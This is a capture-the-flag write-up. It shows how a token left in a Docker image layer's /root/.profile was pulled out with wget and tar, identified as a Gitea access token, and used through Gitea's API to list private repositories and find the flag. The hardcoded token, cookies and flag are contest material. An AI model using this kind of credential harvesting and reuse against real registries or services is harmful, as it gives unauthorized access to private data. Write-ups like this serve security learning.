# LvlUp 02 - Umbrella Corporation

This challenge started in a similar fashion to the last one.

In `days-later.json` obtained in the previous challenge, there was another layer below the flag layer that added a `.profile` file into `/root`. I wonder what could be hiding in there...

```json
{
    "v1Compatibility" : "{\"id\":\"c6524580f59cd11e2d767f7f2b779710613cfe6c6e3cac4e3b1c3c3db17daa07\",\"created\":\"2021-11-19T20:11:22.4138698Z\",\"Cmd\":{\"container_config\":\"/bin/sh -c #(nop) COPY file:040d84f76aa216e4e4ac81c99b0461b61b2e148f4d45f7952a303768f3ae6968 in /root/.profile \"},\"parent\":\"a2bfb8798151656f29229dfdc0c86ff8586e7ae982c30ff8febfc43b7d33a836\"}"
}
```

I then found the relevant blob entry using its index in the manifest.

```json
{
    "blobSum" : "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
}
```

Finally, I downloaded it and checked out what was inside.

```shell
$ wget https://devhole.hfctf.ca:8081/repository/Left4Dead/v2/-/blobs/sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
$ tar zxvf sha256\:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
$ cat root/.profile
TOKEN=5111e2159e3e3cf1dc3bcfe6c8ad2bdd72d58438
```

Initially, I wasn't too sure what this token was, I tried using it in a bunch of places to no avail. Eventually, I signed up on the Gitea discovered earlier at https://devhole.hfctf.ca:3000 and generated a personal access token. It was the same length as this token so I assumed it was a Gitea access token.

I then used Gitea's API to search for any private repos accessible with this token. I found out that it belonged to the username `Nemesis` and found the flag somewhere in the API reponse.

```shell
http GET 'https://devhole.hfctf.ca:3000/api/v1/repos/search?access_token=5111e2159e3e3cf1dc3bcfe6c8ad2bdd72d58438&is_private=true' \
    'auth_':'' \
    'Cookie':'i_like_gitea=29ad8b853f5f6a4e; _csrf=tmDhQ51ZJcGNw1CCfmByhAnK8qg6MTYzNzM3MzcyNDcwMTc0OTE4OQ'

[...]

HF-85d51299-1bb9-4c3a-b352-81059deba49a
```

🚩